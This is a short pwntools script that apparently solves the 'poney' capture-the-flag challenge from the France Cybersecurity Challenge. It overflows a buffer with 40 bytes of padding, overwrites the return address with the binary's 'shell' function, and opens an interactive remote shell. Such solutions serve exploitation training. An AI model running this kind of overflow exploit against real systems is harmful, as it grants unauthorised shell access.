from pwn import *

b=ELF("./poney")

p=remote("challenges1.france-cybersecurity-challenge.fr", 4000)

padding="A"*40

shell=b.symbols["shell"]

print p.recvuntil(">>>")
log.info("payload : %s" %padding+p64(shell))
p.sendline(padding+p64(shell))
p.interactive()
